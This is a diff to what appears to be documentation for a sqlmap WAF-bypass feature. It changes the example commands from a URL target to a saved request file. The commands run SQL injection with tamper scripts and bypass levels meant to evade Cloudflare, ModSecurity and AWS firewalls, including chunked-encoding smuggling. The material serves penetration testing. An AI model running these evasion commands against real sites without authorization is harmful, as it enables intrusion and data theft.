@@ -24,9 +24,9 @@
 
 **Usage:**
 ```bash
-sqlmap -u "http://target.com/?id=1" --tamper=cloudflarebypas
+sqlmap -r request.req --tamper=cloudflarebypas
 # Or automatically with:
-sqlmap -u "http://target.com/?id=1" --waf-bypass=cloudflare
+sqlmap -r request.req --waf-bypass=cloudflare
 ```
 
 ---
@@ -45,12 +45,12 @@ The `--waf-bypass` option now uses **smart WAF detection** instead of cumulative
 ### New Usage:
 ```bash
 # Auto-detect WAF and apply optimal tampers (max 3-4)
-sqlmap -u "http://target.com/?id=1" --waf-bypass=auto
+sqlmap -r request.req --waf-bypass=auto
 
 # Force specific WAF bypass
-sqlmap -u "http://target.com/?id=1" --waf-bypass=cloudflare
-sqlmap -u "http://target.com/?id=1" --waf-bypass=modsecurity
-sqlmap -u "http://target.com/?id=1" --waf-bypass=aws
+sqlmap -r request.req --waf-bypass=cloudflare
+sqlmap -r request.req --waf-bypass=modsecurity
+sqlmap -r request.req --waf-bypass=aws
 ```
 
 ### Supported WAFs:
@@ -222,26 +222,26 @@ WAFs often don't normalize Unicode before pattern matching:
 
 ```bash
 # Basic WAF bypass (level 1)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=1
+python sqlmap.py -r request.req --waf-bypass=1
 
 # Moderate bypass for Cloudflare/AWS (level 2)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=2
+python sqlmap.py -r request.req --waf-bypass=2
 
 # Aggressive bypass (level 3)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=3
+python sqlmap.py -r request.req --waf-bypass=3
 
 # Advanced bypass with Unicode (level 4)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=4
+python sqlmap.py -r request.req --waf-bypass=4
 
 # Maximum evasion (level 5)
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=5
+python sqlmap.py -r request.req --waf-bypass=5
 
 # Individual tamper scripts
-python sqlmap.py -u "http://target.com/?id=1" --tamper=oversizedrequest
-python sqlmap.py -u "http://target.com/?id=1" --tamper=oversizedrequest,xforwardedfor,randomcase
+python sqlmap.py -r request.req --tamper=oversizedrequest
+python sqlmap.py -r request.req --tamper=oversizedrequest,xforwardedfor,randomcase
 
 # Combined with chunked encoding
-python sqlmap.py -u "http://target.com/?id=1" --chunked --tamper=chunkextensionsmuggle
+python sqlmap.py -r request.req --chunked --tamper=chunkextensionsmuggle
 ```
 
 ---
